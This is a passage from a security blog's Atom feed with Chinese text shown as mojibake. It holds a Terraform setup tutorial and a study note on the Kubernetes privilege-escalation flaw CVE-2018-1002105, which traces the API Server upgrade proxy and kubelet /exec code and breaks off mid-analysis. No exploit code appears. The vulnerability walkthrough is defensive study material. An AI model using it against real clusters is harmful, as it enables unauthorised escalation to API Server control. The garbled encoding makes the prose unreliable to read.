<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TeamsSix</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2022-04-08T07:31:16.751Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>TeamsSix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€äº‘åŸç”Ÿã€‘Terraform åˆä½“éªŒ</title>
    <link href="https://www.teamssix.com/220408-145622.html"/>
    <id>https://www.teamssix.com/220408-145622.html</id>
    <published>2022-04-08T06:56:22.000Z</published>
    <updated>2022-04-08T07:31:16.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>Terraform æ˜¯ä¸€ç§å®‰å…¨æœ‰æ•ˆåœ°æ„å»ºã€æ›´æ”¹å’Œç‰ˆæœ¬æ§åˆ¶åŸºç¡€è®¾æ–½çš„å·¥å…·(åŸºç¡€æ¶æ„è‡ªåŠ¨åŒ–çš„ç¼–æ’å·¥å…·)ã€‚</p><p>ç®€å•çš„è¯´å°±æ˜¯å¯ä»¥é€šè¿‡ç¼–å†™ä¸€äº›ç±»ä¼¼äº JSON æ ¼å¼çš„æ–‡ä»¶ï¼Œç›´æ¥åˆ›å»ºä¸€æ‰¹äº‘ä¸Šçš„æœåŠ¡èµ„æºï¼ŒTerraform å’Œ  AWS çš„ CloudFormation äº§å“æœ‰äº›ç±»ä¼¼ï¼Œä½† CloudFormation åªæ”¯æŒ AWSï¼Œäºæ˜¯ HashiCorp å…¬å¸æ‰“é€ äº†ä¸€ä¸ªå¤šäº‘ (Multi Cloud) çš„å¼€æºçš„åŸºç¡€è®¾æ–½å³ä»£ç  (IaC) å·¥å…·ï¼Œå³ Terraform</p><h1 id="0x01-å®‰è£…"><a href="#0x01-å®‰è£…" class="headerlink" title="0x01 å®‰è£…"></a>0x01 å®‰è£…</h1><p>Terraform çš„å®‰è£…å¾ˆç®€å•ï¼Œä¸åŒæ“ä½œç³»ç»Ÿçš„å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><ul><li>Ubuntu</li></ul><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;apt.releases.hashicorp.com&#x2F;gpg | sudo apt-key add -sudo apt-add-repository -y &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;apt.releases.hashicorp.com $(lsb_release -cs) main&quot;sudo apt-get update &amp;&amp; sudo apt-get install -y terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Centos</li></ul><pre class="line-numbers language-none"><code class="language-none">sudo yum install -y yum-utilssudo yum-config-manager --add-repo https:&#x2F;&#x2F;rpm.releases.hashicorp.com&#x2F;RHEL&#x2F;hashicorp.reposudo yum -y install terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Mac</li></ul><pre class="line-numbers language-none"><code class="language-none">brew tap hashicorp&#x2F;tapbrew install hashicorp&#x2F;tap&#x2F;terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-none"><code class="language-none">choco install terraform<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ç›´æ¥åˆ° Terraform å®˜ç½‘ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨ï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ï¼š<a href="https://www.terraform.io/downloads">https://www.terraform.io/downloads</a></p><h1 id="0x02-åˆä½“éªŒ"><a href="#0x02-åˆä½“éªŒ" class="headerlink" title="0x02 åˆä½“éªŒ"></a>0x02 åˆä½“éªŒ</h1><p>åœ¨ä½¿ç”¨ Terraform ä¹‹å‰ï¼Œéœ€è¦å…ˆåœ¨å¯¹åº”çš„äº‘å‚å•†æ§åˆ¶å°ä¸Šç”Ÿæˆä¸€ä¸ª Access Keyï¼Œè¿™é‡Œä»¥åœ¨ AWS ä¸Šåˆ›å»ºä¸€ä¸ª S3 æœåŠ¡ä¸ºä¾‹ã€‚</p><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚ demo æ–‡ä»¶å¤¹ï¼Œæ¥ç€åœ¨é‡Œé¢åˆ›å»ºä¸€ä¸ª s3demo.tf æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">provider &quot;aws&quot; &#123;  region     &#x3D; &quot;us-west-1&quot;  access_key &#x3D; &quot;your-access-key&quot;  secret_key &#x3D; &quot;your-secret-key&quot;&#125;resource &quot;aws_s3_bucket&quot; &quot;b&quot; &#123;  bucket &#x3D; &quot;my-tf-test-bucket-asdqqsdasd&quot;  tags &#x3D; &#123;    Name        &#x3D; &quot;My bucket&quot;    Environment &#x3D; &quot;Dev&quot;  &#125;&#125;resource &quot;aws_s3_bucket_acl&quot; &quot;example&quot; &#123;  bucket &#x3D; aws_s3_bucket.b.id  acl    &#x3D; &quot;private&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tf æ–‡ä»¶é‡‡ç”¨çš„æ˜¯ HCL æ ¼å¼ï¼ŒHCL æ ¼å¼æ˜¯ Terraform æ‰€å±å…¬å¸ HashiCorp è‡ªå·±è®¾è®¡çš„ä¸€å¥—é…ç½®è¯­è¨€</p><p>åœ¨ demo æ–‡ä»¶å¤¹ä¸‹ï¼Œè¿è¡Œä¸€ä¸‹åˆå§‹åŒ–å‘½ä»¤ï¼Œè¿™æ—¶ Terraform ä¼šé€šè¿‡å®˜æ–¹æ’ä»¶ä»“åº“ä¸‹è½½å¯¹åº”çš„ Provider æ’ä»¶</p><pre class="line-numbers language-none"><code class="language-none">terraform init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081514038.png"></p><p>å› ä¸ºæˆ‘ä»¬è¿™é‡Œçš„ s3demo.tf é‡Œçš„ Provider æ˜¯ AWSï¼Œæ‰€ä»¥åœ¨åˆå§‹åŒ–æ—¶ï¼ŒTerraform å°±ä¼šå»ä¸‹è½½ AWS çš„ Provider æ’ä»¶</p><p>åœ¨ <a href="https://registry.terraform.io/browse/providers">https://registry.terraform.io/browse/providers</a> å¯ä»¥çœ‹åˆ° Terraform æ‰€æ”¯æŒçš„å‚å•†ï¼Œè¿™é‡ŒåŸºæœ¬ä¸Šæ˜¯æ¶µç›–äº†å¤§éƒ¨åˆ†äº‘å‚å•†çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081515182.png"></p><p>æ¥ç€ä½¿ç”¨ plan å‘½ä»¤æŸ¥çœ‹æ¥ä¸‹æ¥å°†è¦äº§ç”Ÿçš„å˜æ›´</p><pre class="line-numbers language-none"><code class="language-none">terraform plan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081515816.png"></p><p>å¦‚æœæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå°±å¯ä»¥åº”ç”¨äº†</p><pre class="line-numbers language-none"><code class="language-none">terraform apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081516114.png"></p><p>ä¸­é€”ä¼šæç¤ºç¡®è®¤ï¼Œè¾“å…¥ yes å³å¯</p><p>åœ¨ Terraform æ‰§è¡Œå®Œä¹‹åï¼ŒæŸ¥çœ‹ AWS ä¸‹çš„ S3 å°±å¯ä»¥çœ‹åˆ°åˆšåˆšé€šè¿‡ Terraform åˆ›å»ºçš„èµ„æºäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081516221.png"></p><p>è¿™æ ·å°±å®Œæˆäº†ä½¿ç”¨ Terraform éƒ¨ç½²äº‘èµ„æºçš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œæƒ³è¦æ¸…ç†åˆšåˆšåˆ›å»ºçš„èµ„æºä¹Ÿéå¸¸ç®€å•ï¼Œç›´æ¥ destroy å³å¯</p><pre class="line-numbers language-none"><code class="language-none">terraform destroy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081517821.png"></p><h1 id="0x03-ä¸€äº›æœ‰æ„æ€çš„"><a href="#0x03-ä¸€äº›æœ‰æ„æ€çš„" class="headerlink" title="0x03 ä¸€äº›æœ‰æ„æ€çš„"></a>0x03 ä¸€äº›æœ‰æ„æ€çš„</h1><h2 id="1ã€å¯åŠ¨æ’ä»¶ç¼“å­˜"><a href="#1ã€å¯åŠ¨æ’ä»¶ç¼“å­˜" class="headerlink" title="1ã€å¯åŠ¨æ’ä»¶ç¼“å­˜"></a>1ã€å¯åŠ¨æ’ä»¶ç¼“å­˜</h2><p>åœ¨åˆšåˆšè¿›è¡Œ init åˆå§‹åŒ–æ—¶ï¼ŒTerraform ä¼šæ ¹æ® tf æ–‡ä»¶å†…çš„ Provider ä¸‹è½½å¯¹åº”çš„æ’ä»¶ï¼Œè¿™äº›æ’ä»¶å¾€å¾€ä½“ç§¯æ¯”è¾ƒå¤§ï¼Œä¾‹å¦‚ä¸Šé¢åˆå§‹åŒ–æ—¶ä¸‹è½½çš„ AWS Provider ä½“ç§¯å°±æœ‰ä¸¤ç™¾å¤š Mï¼Œå¦‚æœä¸å¯ç”¨æ’ä»¶ç¼“å­˜ï¼Œé‚£ä¹ˆåœ¨æ¯ä¸ª Terraform é¡¹ç›®ä¸­éƒ½ä¼šåå¤ä¸‹è½½è¿™äº›æ’ä»¶ï¼Œå°±å¾ˆæµªè´¹ç£ç›˜ç©ºé—´ä¸æµé‡ï¼Œå› æ­¤å»ºè®®å°†æ’ä»¶ç¼“å­˜å¼€å¯ã€‚</p><p>Windows ä¸‹æ˜¯åœ¨ç›¸å…³ç”¨æˆ·çš„ %APPDATA% ç›®å½•ä¸‹åˆ›å»ºåä¸º â€œterraform.rcâ€ çš„æ–‡ä»¶ï¼ŒMacos å’Œ Linux ç”¨æˆ·åˆ™æ˜¯åœ¨ç”¨æˆ·çš„ home ä¸‹åˆ›å»ºåä¸º â€œ.terraformrcâ€ çš„æ–‡ä»¶</p><p>.terraformrc æ–‡ä»¶å†…å®¹ä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">plugin_cache_dir &#x3D; &quot;$HOME&#x2F;.terraform.d&#x2F;plugin-cache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·æ¯æ¬¡ä¸‹è½½ Provider æ’ä»¶æ—¶ï¼Œå°±ä¼šä¸‹è½½åˆ° â€œ$HOME/.terraform.d/plugin-cacheâ€ ç›®å½•ä¸‹äº†ï¼Œä¸è¿‡ Terraform ä¸ä¼šä¸»åŠ¨æ¸…ç†è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œå› æ­¤å¯èƒ½éšç€æ’ä»¶ç‰ˆæœ¬çš„æ›´è¿­ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹å†…ä¼šä¿å­˜ä¸€äº›å†å²ç‰ˆæœ¬çš„ Provider æ’ä»¶ï¼Œè¿™æ—¶å°±éœ€è¦è‡ªå·±æ‰‹åŠ¨æ¸…ç†ä¸€ä¸‹äº†ã€‚</p><h2 id="2ã€å¯è§†åŒ–-Terraform"><a href="#2ã€å¯è§†åŒ–-Terraform" class="headerlink" title="2ã€å¯è§†åŒ– Terraform"></a>2ã€å¯è§†åŒ– Terraform</h2><p>å¦‚æœ Terraform é¡¹ç›®æ¯”è¾ƒå¤æ‚ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨ tfviz è¿™ä¸ªå·¥å…·ï¼Œå¯è§†åŒ– Terraform é¡¹ç›®ï¼Œtfviz é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/steeve85/tfviz">https://github.com/steeve85/tfviz</a></p><p>å®‰è£…</p><pre class="line-numbers language-none"><code class="language-none">O111MODULE&#x3D;on go get -u github.com&#x2F;steeve85&#x2F;tfviz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ° Terraform é¡¹ç›®ç›®å½•ä¸‹ä½¿ç”¨</p><pre class="line-numbers language-none"><code class="language-none">tfviz -input .&#x2F; -output tfimg.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081517920.png"></p><h2 id="3ã€Terraform-ä»£ç å®‰å…¨æ€§æ£€æŸ¥"><a href="#3ã€Terraform-ä»£ç å®‰å…¨æ€§æ£€æŸ¥" class="headerlink" title="3ã€Terraform ä»£ç å®‰å…¨æ€§æ£€æŸ¥"></a>3ã€Terraform ä»£ç å®‰å…¨æ€§æ£€æŸ¥</h2><p>å¦‚æœæƒ³çŸ¥é“è‡ªå·±å†™çš„ Terraform é¡¹ç›®ä»£ç æœ‰æ²¡æœ‰ä»€ä¹ˆå®‰å…¨é£é™©ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ tfsec è¿™ä¸ªå·¥å…·ï¼Œtfsec é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/aquasecurity/tfsec">https://github.com/aquasecurity/tfsec</a></p><p>Mac å¯ä»¥ç›´æ¥ä½¿ç”¨ brew å®‰è£…</p><pre class="line-numbers language-none"><code class="language-none">brew install tfsec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ä½¿ç”¨ go install å®‰è£…</p><pre class="line-numbers language-none"><code class="language-none">go install github.com&#x2F;aquasecurity&#x2F;tfsec&#x2F;cmd&#x2F;tfsec@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ä¹Ÿéå¸¸ç®€å•ï¼Œç›´æ¥æ¥åˆ° Terraform é¡¹ç›®ç›®å½•ä¸‹ï¼Œä½¿ç”¨ tfsec . å‘½ä»¤å³å¯</p><pre class="line-numbers language-none"><code class="language-none">tfsec .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081518327.png"></p><blockquote><p> æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p><p> å‚è€ƒæ–‡ç« ï¼š</p><p> <a href="https://www.cnblogs.com/sparkdev/p/10052310.html">https://www.cnblogs.com/sparkdev/p/10052310.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;Terraform æ˜¯ä¸€ç§å®‰å…¨æœ‰æ•ˆåœ°æ„å»ºã€æ›´æ”¹å’Œç‰ˆæœ¬æ§åˆ¶åŸºç¡€è®¾æ–½çš„å·¥å…·(åŸºç¡€æ¶æ„è‡ªåŠ¨åŒ–çš„ç¼–æ’å·¥å…·)ã€‚</summary>
      
    
    
    
    <category term="äº‘åŸç”Ÿ" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    
    <category term="äº‘åŸç”Ÿ" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="ç¬”è®°" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Terraform" scheme="https://www.teamssix.com/tags/Terraform/"/>
    
  </entry>
  
  <entry>
    <title>ã€äº‘å®‰å…¨ã€‘04 k8s ææƒæ¼æ´ CVE-2018-1002105 å­¦ä¹ </title>
    <link href="https://www.teamssix.com/220324-161756.html"/>
    <id>https://www.teamssix.com/220324-161756.html</id>
    <published>2022-03-24T08:17:56.000Z</published>
    <updated>2022-03-24T09:11:31.538Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä»¥ä¸‹å†…å®¹ä¸ºè‡ªå·±ä¸ªäººçš„å­¦ä¹ ç¬”è®°ï¼Œå› æ­¤å†…å®¹ä¸ä¼šå¤šä¹ˆè¯¦å®ï¼›å…¶ä¸­æœ‰äº›å†…å®¹ä¹Ÿè®¸ä¼šå­˜åœ¨é”™è¯¯ï¼Œå¦‚æœ‰é”™è¯¯æ¬¢è¿ç•™è¨€å¤„æŒ‡å‡ºï¼Œè¿˜æœ›è°…è§£ã€‚</p></blockquote><h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>CVE-2018-1002105 æ˜¯ä¸€ä¸ª k8s ææƒæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸æ”»å‡»è€…åœ¨æ‹¥æœ‰ pod æƒé™çš„æƒ…å†µä¸‹ï¼Œæå‡è‡³ API Server æƒé™ï¼Œå½“æ‹¥æœ‰  API Server æƒé™åï¼Œä¹Ÿå°±ä¸éš¾é€ƒé€¸åˆ°å®¿ä¸»æœºäº†ã€‚</p><p>è¯¥æ¼æ´çš„ CVSS 3.x è¯„åˆ†ä¸º 9.8 åˆ†ï¼Œå—å½±å“ç‰ˆæœ¬å¦‚ä¸‹ï¼š</p><p>Kubernetes v1.0.x-1.9.x<br>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)<br>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)<br>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</p><p>åœ¨å¼€å§‹å­¦ä¹ è¯¥æ¼æ´ä¹‹å‰ï¼Œéœ€è¦å…ˆäº†è§£ä¸€ä¸‹ WebSocketï¼ŒWebSocket æ˜¯ä¸€ç§ç½‘ç»œä¼ è¾“åè®®ï¼Œä½äº OSI æ¨¡å‹çš„åº”ç”¨å±‚ï¼Œå’Œ HTTP åè®®ä¸€æ ·ä¾èµ–äºä¼ è¾“å±‚çš„ TCP åè®®ã€‚</p><p>ä¸ºäº†å®ç°å’Œ HTTP çš„å…¼å®¹æ€§ï¼ŒWebSocket æ¡æ‰‹ä½¿ç”¨ HTTP çš„ Upgrade å¤´ï¼Œå³è¡¨ç¤ºä» HTTP åè®®æ”¹æˆ WebSocket åè®®ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ WebSocket æ¡æ‰‹è¯·æ±‚ã€‚</p><p>å®¢æˆ·ç«¯è¯·æ±‚ï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">GET /chat HTTP/1.1<span class="token key atrule">Host</span><span class="token punctuation">:</span> server.example.com<span class="token key atrule">Upgrade</span><span class="token punctuation">:</span> websocket<span class="token key atrule">Connection</span><span class="token punctuation">:</span> Upgrade<span class="token key atrule">Sec-WebSocket-Key</span><span class="token punctuation">:</span> dGhlIHNhbXBsZSBub25jZQ==<span class="token key atrule">Origin</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//example.com<span class="token key atrule">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> chat<span class="token punctuation">,</span> superchat<span class="token key atrule">Sec-WebSocket-Version</span><span class="token punctuation">:</span> <span class="token number">13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯å“åº”ï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">HTTP/1.1 101 Switching Protocols<span class="token key atrule">Upgrade</span><span class="token punctuation">:</span> websocket<span class="token key atrule">Connection</span><span class="token punctuation">:</span> Upgrade<span class="token key atrule">Sec-WebSocket-Accept</span><span class="token punctuation">:</span> s3pPLMBiTxaQ9kYGzzhZRbK+xOo=<span class="token key atrule">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> chat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸­ï¼Œ<code>Connection: Upgrade</code> è¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›å‡çº§åè®®ï¼Œ<code>Upgrade: WebSocket</code> è¡¨ç¤ºå¸Œæœ›å‡çº§åˆ° WebSocket åè®®ã€‚</p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01 æ¼æ´åˆ†æ"></a>0x01 æ¼æ´åˆ†æ</h1><p>è¿™é‡Œä»¥ k8s v1.11.1 ç‰ˆæœ¬ä¸ºä¾‹ï¼Œä»£ç åœ°å€ï¼š<a href="https://github.com/kubernetes/kubernetes/archive/refs/tags/v1.11.1.tar.gz">https://github.com/kubernetes/kubernetes/archive/refs/tags/v1.11.1.tar.gz</a></p><p>åœ¨è¿›è¡Œæ¼æ´åˆ†æä¹‹å‰ï¼Œå¯ä»¥å…ˆé€šè¿‡ä¸‹å›¾å»äº†è§£ä¸€ä¸‹å®¢æˆ·ç«¯å‘ pod æ‰§è¡Œå‘½ä»¤çš„æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241621405.png"></p><p>é€šè¿‡è¿™å¼ å›¾ä¸éš¾çœ‹å‡ºï¼Œå½“å®¢æˆ·ç«¯å‘ Node èŠ‚ç‚¹é‡Œçš„ Pod å‘é€æŒ‡ä»¤æ—¶ï¼Œä¼šå…ˆç»è¿‡ API Serverï¼Œå†åˆ° Kubeletï¼ŒCVE-2018-1002105 æ¼æ´ä¹Ÿæ˜¯å­˜åœ¨äºè¿™ä¸ªæµç¨‹ä¸­ï¼Œä¸‹é¢å…ˆæ¥çœ‹çœ‹ API Server çš„ä»£ç ï¼Œå†çœ‹çœ‹ Kubelet çš„ä»£ç ã€‚</p><h2 id="API-Server-ä»£ç åˆ†æ"><a href="#API-Server-ä»£ç åˆ†æ" class="headerlink" title="API Server ä»£ç åˆ†æ"></a>API Server ä»£ç åˆ†æ</h2><p>å…ˆæ‰¾åˆ° staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go æ–‡ä»¶ï¼Œupgradeaware.go ç”¨æ¥å¤„ç† API Server çš„ä»£ç†é€»è¾‘ï¼Œåœ¨ upgradeaware.go çš„ 185 è¡Œæœ‰ä¸ª ServerHTTP å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241622143.png"></p><p>åœ¨ 187 è¡Œå¯ä»¥çœ‹åˆ°ï¼ŒServerHTTP å‡½æ•°è°ƒç”¨äº† tryUpgrade å‡½æ•°ï¼Œæ¼æ´å°±å­˜åœ¨äºè¿™ä¸ªå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°ä½äº upgradeaware.go çš„ç¬¬ 236è¡Œï¼Œä¸‹é¢å°±æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241623296.png"></p><p>åœ¨  tryUpgrade å‡½æ•°ä¸­ï¼Œé¦–å…ˆè°ƒç”¨äº† IsUpgradeRequest å‡½æ•°</p><p>IsUpgradeRequest å‡½æ•°ä¼šåˆ¤æ–­ HTTP çš„è¯·æ±‚åŒ…ä¸­æ˜¯å¦å­˜åœ¨<code>Connection: Upgrade</code>ï¼Œå³åˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦æƒ³è¦å‡çº§ï¼Œå¦‚æœå­˜åœ¨å°±ä¼šè¿”å› True</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241623261.png"></p><p>æ¥ç€å›åˆ°åˆšæ‰çš„ tryUpgrade å‡½æ•°ï¼Œåœ¨ tryUpgradeå‡½æ•°åˆ¤æ–­åè®®éœ€è¦å‡çº§ä¹‹åï¼Œå»ºç«‹äº†ä¸åç«¯æœåŠ¡å™¨çš„è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241624195.png"></p><p>æ¥ç€ tryUpgrade å‡½æ•°è¿›è¡Œäº† HTTP Hijack æ“ä½œï¼Œç®€å•çš„è¯´ï¼Œå°±æ˜¯è¿™é‡Œç¨‹åºæ²¡æœ‰å°† HTTP è¿æ¥äº¤ç»™ Go å†…ç½®çš„å¤„ç†æµç¨‹ï¼Œè€Œæ˜¯è‡ªå·±åœ¨ TCP çš„åŸºç¡€ä¸Šè¿›è¡Œäº† HTTP äº¤äº’ï¼Œè¿™æ˜¯ä» HTTP å‡çº§åˆ° WebSocket çš„å…³é”®æ­¥éª¤ä¹‹ä¸€</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241624858.png"></p><p>ç„¶å tryUpgrade å‡½æ•°å°†åç«¯é’ˆå¯¹ä¸Šä¸€æ¬¡çš„è¯·æ±‚å“åº”è¿”å›ç»™å®¢æˆ·ç«¯</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241625276.png"></p><p> ç„¶åä½¿ç”¨ Goroutine å°†å®¢æˆ·ç«¯å’Œåç«¯æœåŠ¡çš„ä»£ç†é€šé“å»ºç«‹äº†èµ·æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241626310.png"></p><p>è¿™é‡Œæ˜¯ API Server ä»£ç ä¸­çš„æµç¨‹ï¼Œä¸‹é¢æ¥çœ‹çœ‹ kubelet çš„æµç¨‹ã€‚</p><h2 id="Kubelet-åˆ†æ"><a href="#Kubelet-åˆ†æ" class="headerlink" title="Kubelet åˆ†æ"></a>Kubelet åˆ†æ</h2><p>Kubelet ä»£ç ä½ç½®åœ¨ pkg/kubelet/server/server.go</p><p>åœ¨ server.go ä¸­å¯ä»¥å‘ç° Kubelet å¯åŠ¨æ—¶ï¼Œä¼šæ³¨å†Œä¸€ç³»åˆ—çš„ APIï¼Œ/exec ä¹Ÿåœ¨å…¶ä¸­ï¼Œè¿™é‡Œä¼šä¸»è¦çœ‹ä¸‹ /exec çš„ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241625425.png"></p><p>åœ¨ server.go çš„ç¬¬ 671 è¡Œï¼Œå¯ä»¥çœ‹åˆ° getExec å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241627573.png"></p><p>åœ¨è¯¥å‡½æ•°çš„ç¬¬ 673 è¡Œï¼Œé¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ª Options å®ä¾‹ï¼Œè¿™é‡Œçœ‹ä¸‹å…¶ä¸­çš„ NewOptions å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241627475.png"></p><p>åœ¨ç¬¬ 61 è¡Œå¯ä»¥çœ‹åˆ°å¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ç»™å‡º stdinã€stdout å’Œ stderr è¿™ä¸‰ä¸ªå‚æ•°ï¼Œè¿™ä¸ª Options å®ä¾‹å°†åˆ›å»ºå¤±è´¥ï¼Œerr å‚æ•°å°†è¿”å›<code>you must specify at least 1 of stdin, stdout, stderr</code></p><p>è¿™æ—¶ getExec å‡½æ•°ç¬¬ 674 è¡Œçš„ if åˆ¤æ–­å°†ä¸ºçœŸï¼Œæ­¤æ—¶ getExec å‡½æ•°å°†ç›´æ¥è¿”å›å®¢æˆ·ç«¯ http.StatusBadRequest å³çŠ¶æ€ç  400</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628491.png"></p><p>è¿™æ—¶ï¼Œå¯ä»¥æ„é€ ä¸€ä¸‹è¯·æ±‚æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®è¿”å›äº† 400ï¼Œå’Œåˆ†æç»“æœä¸€è‡´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628793.png"></p><p>ç»“åˆ API Server çš„ tryUpgrade å‡½æ•°ä»£ç å¯ä»¥å‘ç°ï¼ŒAPI Server å¹¶æ²¡æœ‰å¯¹è¿™ç§é”™è¯¯æƒ…å†µè¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ API Server ä¸­å¹¶æ²¡æœ‰å¯¹è¯·æ±‚çš„è¿”å›å€¼è¿›è¡Œåˆ¤æ–­ï¼Œä¸ç®¡è¿”å›å€¼æ˜¯å¤šå°‘éƒ½ä¼šèµ°åˆ°ä¸‹é¢çš„ Goroutine ä»£ç ä¸­ï¼Œä¾æ—§ä¸º Kubelet 